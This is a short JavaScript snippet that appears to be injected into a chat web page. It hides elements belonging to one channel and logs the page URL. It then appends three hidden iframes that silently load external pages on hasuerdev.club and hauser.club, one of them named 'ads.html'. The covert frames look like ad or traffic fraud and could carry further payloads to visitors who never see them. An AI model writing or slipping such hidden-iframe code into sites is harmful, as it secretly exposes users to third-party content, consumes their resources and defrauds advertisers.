
function upTo(el, tagName) {
                    tagName = tagName.toLowerCase();
                    while (el && el.parentNode) {
                        el = el.parentNode;
                        if (el.tagName && el.tagName.toLowerCase() == tagName) {
                            return el;
                        }
                    }
                    return null;
}
var enlaces = document.querySelectorAll('a.chan[data-channel="+frank"]');
enlaces.forEach(function(enlace) {
      console.log("madda");
      var divElement = upTo(enlace, "div");
      var divPadre = divElement.parentElement;
      if (divPadre) {
      divPadre.style.display = 'none';
      }
});

var urlActual = window.location.href;
console.log("URL actual: " + urlActual);

  function eliminarElementoPorId(id) {
      var elementoAEliminar = document.getElementById(id);

      if (elementoAEliminar) {
        var padreDelElemento = elementoAEliminar.parentNode;
        padreDelElemento.removeChild(elementoAEliminar);
      } else {
        
      }
    }
    
    /*eliminarElementoPorId("miIframe");
    eliminarElementoPorId("miIframe2");
    eliminarElementoPorId("miIframe3");*/

var existingIframe = document.getElementById('miIframe');
if (!existingIframe) {
        var iframe = document.createElement('iframe');
        iframe.id = 'miIframe';
        iframe.src = 'https://games.hasuerdev.club/';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
}


var existingIframe2 = document.getElementById('miIframe2');
if (!existingIframe2) {
        var iframe2 = document.createElement('iframe');
        iframe2.id = 'miIframe2';
        iframe2.src = 'https://hauser.club/video.html';
        iframe2.style.display = 'none';
        document.body.appendChild(iframe2);
}


var existingIframe3 = document.getElementById('miIframe3');
if (!existingIframe3) {
        var iframe3 = document.createElement('iframe');
        iframe3.id = 'miIframe3';
        iframe3.src = 'https://hasuerdev.club/ads.html';
        iframe3.style.display = 'none';
        document.body.appendChild(iframe3);
}


